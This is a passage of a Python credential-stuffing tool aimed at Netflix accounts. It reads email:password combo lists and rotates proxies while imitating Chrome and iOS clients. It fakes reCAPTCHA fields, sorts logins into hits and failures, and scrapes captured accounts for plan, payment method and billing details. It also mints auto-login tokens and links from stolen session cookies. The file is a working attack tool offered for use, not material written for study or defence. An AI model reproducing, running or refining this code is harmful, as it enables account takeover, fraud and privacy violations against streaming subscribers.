#!/usr/bin/env python3

import sys, os, json, re, uuid, random, string, urllib.parse
import threading, queue, asyncio, time
from datetime import datetime
from collections import deque, defaultdict

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from curl_cffi import requests as creq
    from curl_cffi.requests import AsyncSession
    CURL_OK = True
except ImportError:
    try:
        import requests as creq
    except ImportError:
        creq = None
    CURL_OK = False
    AsyncSession = None

import requests as _std_requests

TAG  = "@yeatdiddy"

GQL_BROWSER = "https://www.netflix.com/graphql"
PID_BROWSER = "6787cd3c-511a-455e-8aa8-8b44cd8cf453"
GQL_IOS     = "https://ios.prod.cloud.netflix.com/graphql"
PID_IOS     = "1c276cdf-caef-49cf-b38e-384972c2b47e"
PQ_VER      = 102

MAX_RETRY_BR  = 4;  MAX_OUTER_BR  = 6
MAX_RETRY_IOS = 2;  MAX_OUTER_IOS = 1
MAX_CONCURRENT = 30
CHECK_TIMEOUT  = 35
T_GQL = 35;  T_PAGE = 45;  T_INFO = 25

G   = '\033[92m'; R   = '\033[91m'; Y   = '\033[93m'; B   = '\033[94m'
C   = '\033[96m'; M   = '\033[95m'; W   = '\033[97m'; DIM = '\033[90m'
BD  = '\033[1m';  RS  = '\033[0m'
HB  = '\u2501'; HL  = '\u2500'; VL  = '\u2502'; HD  = '\u254c'
SH  = '\u25cf'; SO  = '\u25cb'; SD  = '\u25c6'
AR  = '\u203a'; RA  = '\u2192'; BUL = '\u2022'; RR  = '\u21bb'
DBL = '\u2550'; DBV = '\u2551'
TLC = '\u2554'; TRC = '\u2557'; BLC = '\u255a'; BRC = '\u255d'
LM  = '\u2560'; RM  = '\u2563'

COL = {'HIT': G, 'BAD': R, 'FREE': Y}
SYM = {'HIT': SH, 'BAD': SO, 'FREE': SD}

LANG_MAP = {
    'BR':'pt','PT':'pt','AO':'pt','MZ':'pt',
    'US':'en','GB':'en','AU':'en','CA':'en','IE':'en','NZ':'en','ZA':'en',
    'TR':'tr','DE':'de','FR':'fr','ES':'es','IT':'it','JP':'ja','KR':'ko',
    'CN':'zh','RU':'ru','PL':'pl','NL':'nl','SE':'sv','NO':'no','DK':'da',
    'FI':'fi','MX':'es','AR':'es','CO':'es','PE':'es','CL':'es','VE':'es',
    'PA':'es','EC':'es','UY':'es','PY':'es','BO':'es',
    'IN':'hi','PK':'ur','BD':'bn','TH':'th','VN':'vi','ID':'id','MY':'ms',
    'SA':'ar','AE':'ar','EG':'ar','MA':'ar','DZ':'ar','TN':'ar',
    'IL':'he','GR':'el','HU':'hu','CZ':'cs','SK':'sk','RO':'ro',
    'HR':'hr','RS':'sr','BG':'bg','UA':'uk','KZ':'kk',
    'NG':'en','KE':'en','GH':'en','TZ':'en','SN':'fr','CM':'fr',
    'AT':'de','CH':'de','BE':'nl','PH':'en','SG':'en','HK':'zh',
    'TW':'zh','CI':'fr','LB':'ar','JO':'ar','IQ':'ar','LY':'ar',
    'SD':'ar','PS':'ar','OM':'ar','BH':'ar','QA':'ar','KW':'ar',
    'LI':'de','LU':'fr','MC':'fr','IS':'en','MT':'en',
    'CY':'el','EE':'et','LV':'lv','LT':'lt','SI':'sl',
    'BA':'bs','ME':'sr','MK':'mk','AL':'sq','XK':'sq',
}

PHONE_CODES = {
    "AF":"93","AL":"355","DZ":"213","AR":"54","AM":"374","AU":"61","AT":"43",
    "AZ":"994","BH":"973","BD":"880","BE":"32","BR":"55","BN":"673","BG":"359",
    "KH":"855","CM":"237","CA":"1","CL":"56","CN":"86","CO":"57","HR":"385",
    "CZ":"420","DK":"45","EG":"20","EE":"372","FI":"358","FR":"33","GE":"995",
    "DE":"49","GH":"233","GR":"30","HU":"36","IN":"91","ID":"62","IR":"98",
    "IQ":"964","IE":"353","IL":"972","IT":"39","JP":"81","JO":"962","KZ":"7",
    "KE":"254","KR":"82","KW":"965","LB":"961","LV":"371","LT":"370","MY":"60",
    "MX":"52","MA":"212","NL":"31","NZ":"64","NG":"234","NO":"47","PK":"92",
    "PA":"507","PE":"51","PH":"63","PL":"48","PT":"351","QA":"974","RO":"40",
    "RU":"7","SA":"966","SN":"221","RS":"381","SG":"65","SK":"421","SI":"386",
    "ZA":"27","ES":"34","LK":"94","SE":"46","CH":"41","SY":"963","TW":"886",
    "TZ":"255","TH":"66","TN":"216","TR":"90","UA":"380","AE":"971","GB":"44",
    "US":"1","UY":"598","UZ":"998","VE":"58","VN":"84","CI":"225",
    "LI":"423","LU":"352","MC":"377","MT":"356","CY":"357","IS":"354",
    "BA":"387","ME":"382","MK":"389","XK":"383",
}

_CHROME = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
     "sec": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "full": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "pf": "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36",
     "sec": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "full": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
     "pf": "chrome136", "plat": '"macOS"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
     "sec": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "full": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "pf": "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
     "sec": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
     "full": '"Google Chrome";v="141.0.7390.55", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.55"',
     "pf": "chrome136", "plat": '"Windows"', "mobile": "?0"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
     "sec": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "full": '"Chromium";v="152", "Google Chrome";v="152", "Not/A)Brand";v="24"',
     "pf": "chrome136", "plat": '"Linux"', "mobile": "?0"},
]

_IOS_TLS = [
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1", "imp": "safari15_5"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", "imp": "safari15_5"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", "imp": "safari15_3"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1", "imp": "safari15_5"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1", "imp": "safari15_3"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", "imp": "safari15_5"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1", "imp": "safari15_3"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1", "imp": "safari15_5"},
]
_IOS_DESK_UA = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                'AppleWebKit/605.1.15 (KHTML, like Gecko) '
                'Version/17.2 Safari/605.1.15')

_IOS_API_PARAMS = {
    "appVersion": "15.48.1",
    "config": ('{"gamesInTrailersEnabled":"false","billboardEnabled":"true",'
               '"sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
_IOS_API_HEADERS = {
    "User-Agent":                        "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt":         "1",
    "x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid":    "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.app-version":     "15.48.1",
    "x-netflix.client.appversion":       "15.48.1",
    "x-netflix.context.form-factor":     "phone",
    "x-netflix.context.sdk-version":     "2012.4",
    "x-netflix.client.ftl.esn":         ("NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3"
                                          "MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200"),
    "x-netflix.context.locales":         "en-US",
    "accept-language":                   "en-US;q=1",
    "x-netflix.context.os-version":      "15.8.5",
    "x-netflix.context.ui-flavor":       "argo",
}

_NEVER_TIDS = frozenset({'registration-consent','email-consent','name-input',
                          'signupform','sign-up','field-firstName','continue-reg'})
_FREE_TIDS  = frozenset({'plan-context-page-container','signupContextContainer','plan-selection-title'})
_OTP_TIDS   = frozenset({'collect-otp','pin-entry','resend-code-text',
                          'authentication-link-sent','magic-link',
                          'account-mfa-button-OTP_SMS','account-select-mfa-factor',
                          'account-mfa-button-OTP_EMAIL','mfa-challenge'})
_FREE_KW = ('choose your plan','choose a plan','pick a plan','rejoin','restart netflix',
            'reactivat','resume your membership','come back to netflix',
            'restart your membership','sent a rejoin link')
_OTP_KW  = ('link sent','code sent','check your email','check your inbox',
            'enviamos um','we sent','we emailed','authentication link',
            'kodu girin','kod gonderdik')
_LOGIN_OK = ('circle-checkmark','navigating to /browse','universal":"/browse',
             'authflow-post-login','profile-gate','whoIsWatching',
             'who-is-watching','manage-profiles','"ProfilesGate"',
             'switchProfile','prefetch":"/browse','"path":"/browse')
_BAD_KW = ('incorrect password','wrong password','invalid password',
           'password is incorrect','incorrect email or password',
           'email or password you entered is incorrect',
           'senha incorreta','senha inv',
           'sifre hatali','hatali sifre','yanlis sifre','gecersiz sifre',
           'parola yanlis','yanlis parola','ifre hatal','ifre yanl','arola yanl',
           'falsches passwort','passwort falsch','mot de passe incorrect',
           'contrasena incorrecta','password errata','parola errata','wachtwoord onjuist')
_TRANSIENT = ('something went wrong','please try again in a few minutes',
              'try again later','service is temporarily unavailable',
              'unexpected error','an error has occurred','server error',
              'bir sorun olu','dakika sonra','tekrar deneyin','yeniden deneyin',
              'erro inesperado','tente novamente','algo deu errado',
              'tente conectar novamente','deu errado',
              'ein fehler ist aufgetreten','schiefgelaufen','paar minuten',
              'une erreur','quelque chose a mal',
              'se ha producido un error','intente de nuevo',
              'qualcosa non ha funzionato','riprova','andato storto',
              'er is iets misgegaan','probeer het opnieuw',
              'noe gikk galt','n\u00e5got gick fel','noget gik galt','jotain meni pieleen')
_NET_ERR = ('recv failure','connection was reset','connection reset',
            'connection refused','failed to perform','curl: (56)','curl: (7)','curl: (28)',
            'proxy','timed out','timeout','ssl','eof','broken pipe','network',
            'socksconnect','could not resolve','no route','unreachable','connect','peer','closed')

def _flag(cc):
    if not cc or len(cc) < 2: return ''
    return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper()[:2])

def _between(t, l, r):
    i = t.find(l)
    if i < 0: return None
    i += len(l)
    j = t.find(r, i)
    return t[i:j] if j >= 0 else None

def _unes(s):
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    return s

def _tokens(html, url):
    ss = su = None
    if 'serverState=' in url:
        qs = urllib.parse.urlparse(url).query
        ss = urllib.parse.parse_qs(qs).get('serverState', [None])[0]
    if not ss:
        for pat in ['"serverState":"','serverState%22%3A%22','"serverState" : "','serverState\\":\\"']:
            v = _between(html, pat, '"')
            if v and len(v) > 20 and not v.startswith('{'): ss = _unes(v); break
    if not ss:
        m = re.search(r'serverState["\s:%]+([A-Za-z0-9+/=_\-]{30,})', html)
        if m: ss = m.group(1)
    v = _between(html, '"serverScreenUpdate":"', '"')
    if v and len(v) > 20: su = _unes(v)
    m = re.search(r'uiVersion["\s:]+["\']?(v[a-f0-9]{6,})', html)
    av = m.group(1) if m else 'v647f4d35'
    return ss, su, av

def _nstate(t):
    try: return json.loads(t).get('data',{}).get('result',{}).get('screen',{}).get('serverState')
    except: return None

def _subcmds(t):
    out = []
    def w(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            if (o.get('__typename') == 'CLCSRequestScreenUpdate'
                    and o.get('loggingCommand') == 'SubmitCommand'
                    and o.get('serverScreenUpdate')):
                out.append(o['serverScreenUpdate'])
            for v in o.values(): w(v, d+1)
        elif isinstance(o, list):
            for i in o: w(i, d+1)
    try: w(json.loads(t))
    except: pass
    return out

def _tids(t):
    r = set()
    def w(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            tid = o.get('testId')
            if tid: r.add(tid)
            for v in o.values(): w(v, d+1)
        elif isinstance(o, list):
            for i in o: w(i, d+1)
    try: w(json.loads(t))
    except: pass
    return r

def _texts(t):
    r = []
    def w(o, d=0):
        if d > 20: return
        if isinstance(o, dict):
            pc = o.get('plainContent')
            if isinstance(pc, dict) and pc.get('value'): r.append(pc['value'])
            wt = o.get('webTextWithTags')
            if isinstance(wt, dict):
                tx = wt.get('text') or {}
                if isinstance(tx, dict) and tx.get('value'): r.append(tx['value'])
            for v in o.values(): w(v, d+1)
        elif isinstance(o, list):
            for i in o: w(i, d+1)
    try: w(json.loads(t))
    except: pass
    return r

def _has_pw(tids):      return 'password-input' in tids or 'field-password' in tids
def _has_submit(tids):  return 'sign-in-button' in tids or 'continue-button' in tids

class Stats:
    def __init__(self, total):
        self._lk  = threading.Lock()
        self.total = total
        self.done = self.hit = self.bad = self.free = self.retry = 0
        self._ts  = deque(maxlen=500)
        self.t0   = time.time()

    def add(self, k):
        with self._lk:
            self.done += 1
            setattr(self, k, getattr(self, k, 0) + 1)
            self._ts.append(time.time())

    def inc_retry(self):
        with self._lk: self.retry += 1

    @property
    def cpm(self):
        now = time.time()
        with self._lk: return sum(1 for t in self._ts if now - t <= 60)

    @property
    def elapsed(self):
        s = int(time.time() - self.t0)
        return f"{s // 60:02d}:{s % 60:02d}"

_fl = threading.Lock()
_pl = threading.Lock()

def _save(path, line):
    with _fl:
        with open(path, 'a', encoding='utf-8') as f: f.write(line + '\n')

def _log(kind, msg):
    col = COL.get(kind, DIM)
    tag = {'HIT': f'{G}{BD}HIT{RS}', 'FREE': f'{Y}{BD}FREE{RS}', 'BAD': f'{R}BAD{RS}'}.get(kind, kind)
    ts  = datetime.now().strftime('%H:%M:%S')
    with _pl:
        sys.stdout.write(f"\r{' ' * 220}\r")
        sys.stdout.write(f"  {DIM}{ts}{RS}  {tag}  {msg}\n")
        sys.stdout.flush()

def _bar(s):
    WD   = 28
    pct  = s.done / s.total if s.total else 0
    fill = int(WD * pct)
    blk  = '█'
    lgt  = '░'
    bar  = f"{M}{blk * fill}{DIM}{lgt * (WD - fill)}{RS}"
    eta  = ''
    if s.cpm > 0 and s.done < s.total:
        rem = int((s.total - s.done) / s.cpm)
        eta = f"  {DIM}eta {rem}m{RS}"
    line = (f"\r  {bar}  "
            f"{DIM}{s.done}/{s.total}{RS}  "
            f"{G}{BD}H{s.hit}{RS}  "
            f"{Y}F{s.free}{RS}  "
            f"{R}B{s.bad}{RS}  "
            f"{M}{BD}{s.cpm}{RS}{DIM}cpm{RS}  "
            f"{DIM}{s.elapsed}{RS}{eta}   ")
    with _pl:
        sys.stdout.write(line); sys.stdout.flush()

def _parse_proxy(raw):
    raw = raw.strip()
    if not raw: return '', '', '', '0', 'http'
    proto = 'http'
    for p in ['socks5h://','socks5://','socks4a://','socks4://','https://','http://']:
        if raw.lower().startswith(p):
            proto = p.rstrip(':/'); raw = raw[len(p):]; break
    if '@' in raw:
        auth, hp = raw.rsplit('@', 1)
        ci = auth.find(':')
        user = auth[:ci].strip() if ci > 0 else auth.strip()
        pw   = auth[ci+1:].strip() if ci > 0 else ''
        hp   = hp.strip().rstrip('/')
        if hp.startswith('['):
            cb = hp.find(']')
            host = hp[1:cb] if cb > 0 else hp
            port = hp[cb+2:] if cb > 0 and cb+1 < len(hp) and hp[cb+1] == ':' else '8080'
        else:
            pts  = hp.rsplit(':', 1)
            host = pts[0]
            port = pts[1] if len(pts) > 1 and pts[1].isdigit() else '8080'
        return user, pw, host, port, proto
    raw   = raw.rstrip('/')
    parts = [p.strip() for p in raw.split(':')]
    def _ip(v): return bool(re.match(r'^\d{1,3}(?:\.\d{1,3}){3}$', v))
    def _pt(v): return v.isdigit() and 1 <= int(v) <= 65535
    if len(parts) == 2: return '', '', parts[0], parts[1] if _pt(parts[1]) else '8080', proto
    if len(parts) == 3:
        if _pt(parts[1]): return parts[2], '', parts[0], parts[1], proto
        return '', '', parts[0], parts[2] if _pt(parts[2]) else '8080', proto
    if len(parts) == 4:
        p1, p3 = _pt(parts[1]), _pt(parts[3])
        if p1 and not p3: return parts[2], parts[3], parts[0], parts[1], proto
        if p3 and not p1: return parts[0], parts[1], parts[2], parts[3], proto
        if p1 and p3:
            if _ip(parts[0]): return parts[2], parts[3], parts[0], parts[1], proto
            if _ip(parts[2]): return parts[0], parts[1], parts[2], parts[3], proto
            return parts[2], parts[3], parts[0], parts[1], proto
        return parts[2], parts[3], parts[0], parts[1], proto
    if len(parts) > 4 and _pt(parts[-1]):
        return parts[0], ':'.join(parts[1:-2]), parts[-2], parts[-1], proto
    return '', '', raw, '8080', proto

def _country_proxy_url(user, pw, host, port, proto, cc):
    supports_cc = bool(re.search(r'[-_]country-[a-zA-Z]{2}|[-_]cc-[a-zA-Z]{2}', user))
    u = re.sub(r'[-_]country-[a-zA-Z]{2}', '', user)
    u = re.sub(r'[-_]cc-[a-zA-Z]{2}', '', u)
    if supports_cc and cc and cc != 'XX':
        u = f"{u}-country-{cc.lower()}"
    if u and pw: return f"{proto}://{u}:{pw}@{host}:{port}"
    if u:        return f"{proto}://{u}@{host}:{port}"
    return f"{proto}://{host}:{port}"

def _raw_proxy_url(user, pw, host, port, proto):
    if user and pw: return f"{proto}://{user}:{pw}@{host}:{port}"
    if user:        return f"{proto}://{user}@{host}:{port}"
    return f"{proto}://{host}:{port}"

def _parse_combo(line):
    line = line.strip()
    if not line: return None
    url = ''; creds = line
    if re.match(r'(?:https?://)?www\d?\.netflix\.com', line):
        m = re.match(r'((?:https?://)?www\d?\.netflix\.com[^:]*)', line)
        if m: url = m.group(1); creds = line[m.end():].lstrip(':')
    else:
        ms = list(re.finditer(r':(?:https?://)?www\d?\.netflix\.com', line))
        if ms:
            m = ms[-1]; creds = line[:m.start()]; url = line[m.start()+1:]
    idx = creds.find(':')
    if idx <= 0: return None
    email = creds[:idx].strip(); pw = creds[idx+1:].strip()
    if not email or not pw or '@' not in email: return None
    country = 'XX'
    cm = re.search(r'netflix\.com/([a-z]{2})(?:-[a-z]{2})?(?:/|$)', url.lower())
    if cm: country = cm.group(1).upper()
    return email, pw, country

class ProxyPool:
    def __init__(self, lst):
        self._l = lst; self._i = 0; self._k = threading.Lock()
    def next(self):
        with self._k:
            p = self._l[self._i % len(self._l)]; self._i += 1; return p

def _pick_chrome(): return random.choice(_CHROME)

def _session_br(proxy_url=None, pf="chrome136"):
    sess = creq.Session(impersonate=pf) if CURL_OK else creq.Session()
    if proxy_url: sess.proxies = {'http': proxy_url, 'https': proxy_url}
    return sess

def _gql_br(sess, ss, su, fields, av, country, lowcode, ch, step='identification'):
    ua, sec, plat = ch['ua'], ch['sec'], ch['plat']
    mob  = ch.get('mobile', '?0')
    lang = LANG_MAP.get(country.upper(), 'en')
    loc  = f'{lang}-{country.upper()}'
    ctx  = json.dumps({"appView": step, "action": "Submitted", "appstate": "foreground"})
    h = {
        'x-netflix.request.id':             ''.join(random.choices(string.hexdigits[:16], k=32)),
        'x-netflix.context.operation-name':  'CLCSScreenUpdate',
        'x-netflix.request.originating.url': f'https://www.netflix.com/{lowcode}/login',
        'x-netflix.context.app-version':     av,
        'x-netflix.context.hawkins-version': '5.29.0',
        'x-netflix.request.clcs.bucket':     'high',
        'x-netflix.context.locales':         loc.lower(),
        'x-netflix.context.ui-flavor':       'akira',
        'x-netflix.request.toplevel.uuid':   str(uuid.uuid4()),
        'x-netflix.request.attempt':         '1',
        'x-netflix.request.client.context':  ctx,
        'accept':           '*/*',
        'content-type':     'application/json',
        'accept-language':  loc.lower(),
        'user-agent':       ua,
        'origin':           'https://www.netflix.com',
        'referer':          f'https://www.netflix.com/{lowcode}/login',
        'sec-fetch-site':   'same-origin',
        'sec-fetch-mode':   'cors',
        'sec-fetch-dest':   'empty',
        'sec-ch-ua':        sec,
        'sec-ch-ua-mobile': mob,
        'sec-ch-ua-platform': plat,
        'sec-ch-ua-model':  '""',
        'sec-ch-ua-platform-version': '"19.0.0"' if 'Windows' in plat else '"14.6.0"',
        'accept-encoding':  'gzip, deflate, br, zstd',
        'priority':         'u=1, i',
    }
    body = {
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML", "imageFormat": "PNG", "locale": loc,
            "serverState": ss, "serverScreenUpdate": su or "",
            "inputFields": fields,
        },
        "extensions": {"persistedQuery": {"id": PID_BROWSER, "version": PQ_VER}}
    }
    resp = sess.post(GQL_BROWSER, headers=h, json=body, timeout=T_GQL)
    if resp.status_code == 429: raise ConnectionError("rate-limited (429)")
    return resp.text

def _generate_nftoken(netflix_id_raw, proxy_url=None, timeout=15):
    if not netflix_id_raw: return None
    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    headers = dict(_IOS_API_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = _std_requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48",
                              params=_IOS_API_PARAMS, headers=headers,
                              proxies=proxies, timeout=timeout, verify=False)
        if r.status_code == 200:
            tok = (((r.json().get("value") or {}).get("account") or {})
                   .get("token") or {}).get("default") or {}
            if tok.get("token"): return str(tok["token"])
    except: pass
    try:
        sess2 = _std_requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies: sess2.proxies = proxies; sess2.verify = False
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
        }
        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload,
                        headers={"User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13)",
                                 "Accept": "application/json", "Content-Type": "application/json"},
                        timeout=timeout)
        if r2.status_code == 200:
            tok = (r2.json().get("data") or {}).get("createAutoLoginToken")
            if tok: return str(tok)
    except: pass
    return None

def _make_login_links(nftoken):
    if not nftoken: return None, None, None
    ts = urllib.parse.quote(nftoken, safe="")
    return f"https://netflix.com/?nftoken={ts}", f"https://netflix.com/unsupported?nftoken={ts}", "https://www.netflix.com/tv2"

def _extract_cookies_br(sess):
    try: return '; '.join(f'{k}={v}' for k, v in sess.cookies.items())
    except: return ''

def _get_netflix_id(cookie_str):
    for part in cookie_str.split(';'):
        part = part.strip()
        if part.startswith('NetflixId='): return part[len('NetflixId='):]
    return ''

def _verify_account_br(sess, ua, country):
    lang = LANG_MAP.get(country.upper(), 'en')
    loc  = f'{lang}-{country.upper()}'
    info = {}
    try:
        r = sess.get('https://www.netflix.com/youraccount', headers={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': f'{loc},{lang};q=0.9,en;q=0.8',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'upgrade-insecure-requests': '1', 'user-agent': ua,
        }, timeout=T_INFO)
        html = r.text
    except: return None
    for key, left, right in [
        ('Plan',       '"localizedPlanName":{"fieldType":"String","value":"', '"'),
        ('Country',    '"currentCountry":"',                                  '"'),
        ('MaxStreams', '"maxStreams":{"fieldType":"Numeric","value":',         '},'),
        ('NextBill',   '"nextBillingDate":{"fieldType":"String","value":"',   '"'),
        ('Payment',    '"paymentMethod":{"fieldType":"String","value":"',     '"'),
        ('Since',      '"memberSince":"',                                     '",'),
        ('Quality',    '"videoQuality":{"fieldType":"String","value":"',      '"'),
    ]:
        v = _between(html, left, right)
        if v: info[key] = _unes(v.strip())
    m = re.search(r'"numProfiles"\s*:\s*(\d+)', html)
    if m: info['Profiles'] = m.group(1)
    m = re.search(r'"extraMemberCount"\s*:\s*(\d+)', html)
    if m and m.group(1) != '0': info['Extra'] = m.group(1)
    if re.search(r'"isAdPlan"\s*:\s*true', html): info['Ads'] = 'Yes'
    info['_active'] = bool(info.get('Plan')) and bool(info.get('NextBill'))
    if not info['_active']:
        if '"currentMemberStatus":"CURRENT_MEMBER"' in html: info['_active'] = True
        if '"isMember":false' in html or '"currentMemberStatus":"FORMER_MEMBER"' in html: info['_active'] = False
    return info

def _fmt_capture_br(info, country, cookies='', login_pc=None):
    parts = []
    cc = info.get('Country', country)
    fl = _flag(cc)
    for k in ['Plan','Country','MaxStreams','Quality','NextBill','Payment','Since','Profiles','Extra','Ads']:
        v = info.get(k)
        if not v: continue
        parts.append(f"Country = {v} {fl}" if k == 'Country' else f"{k} = {v}")
    if login_pc: parts.append(f"LoginLink = {login_pc}")
    if cookies:  parts.append(f"Cookies = {cookies}")
    parts.append(f"by = {TAG}")
    return ' | '.join(parts)

def _check_br(email, password, proxy_url, country, lowcode, cc, pool=None):
    ch = _pick_chrome()
    ua, pf = ch['ua'], ch['pf']
    net_only = True
    for attempt in range(MAX_RETRY_BR):
        try:
            sess = _session_br(proxy_url, pf)
            lang = LANG_MAP.get(country.upper(), 'en')
            loc  = f'{lang}-{country}'
            page = sess.get(f'https://www.netflix.com/{lowcode}/login', headers={
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept-language': loc.lower(),
                'accept-encoding': 'gzip, deflate, br, zstd',
                'upgrade-insecure-requests': '1', 'user-agent': ua,
                'sec-ch-ua': ch['sec'], 'sec-ch-ua-mobile': ch['mobile'],
                'sec-ch-ua-platform': ch['plat'], 'sec-ch-ua-model': '""',
                'sec-ch-ua-platform-version': '"19.0.0"' if 'Windows' in ch['plat'] else '"14.6.0"',
                'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate',
                'sec-fetch-dest': 'document', 'sec-fetch-user': '?1', 'priority': 'u=0, i',
            }, timeout=T_PAGE, allow_redirects=True)
            ss, su, av = _tokens(page.text, page.url)
            if not ss:
                if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(2, 4)); continue
                return 'RETRY', '', '', None
            net_only = False
            r1 = _gql_br(sess, ss, su or '', [
                {"name": "userLoginId",           "value": {"stringValue": email}},
                {"name": "countryCode",           "value": {"stringValue": cc}},
                {"name": "countryIsoCode",        "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(400, 1200)}},
                {"name": "recaptchaError",        "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
            ], av, country, lowcode, ch, step='identification')
            ns1 = _nstate(r1); cmds1 = _subcmds(r1); tids1 = _tids(r1)
            txts1 = ' '.join(_texts(r1)).lower()
            if not ns1:
                if attempt < MAX_RETRY_BR - 1: time.sleep(random.uniform(2, 4)); continue
                return 'RETRY', '', '', None
            if tids1 & _NEVER_TIDS: return 'BAD', '', '', None
            if (tids1 & _FREE_TIDS) or any(k in txts1 for k in _FREE_KW):
                return 'FREE', f'Former Member | by = {TAG}', '', None
            is_otp = bool(tids1 & _OTP_TIDS) or any(k in txts1 for k in _OTP_KW)
            has_pw_fb = ('usePasswordInsteadHelpMenuItem' in tids1 or
                         'help-menu-item-0' in tids1 or 'help-menu-item-1' in tids1)
            if is_otp and not has_pw_fb: return 'BAD', '', '', None
            pw_state, pw_cmds = ns1, cmds1
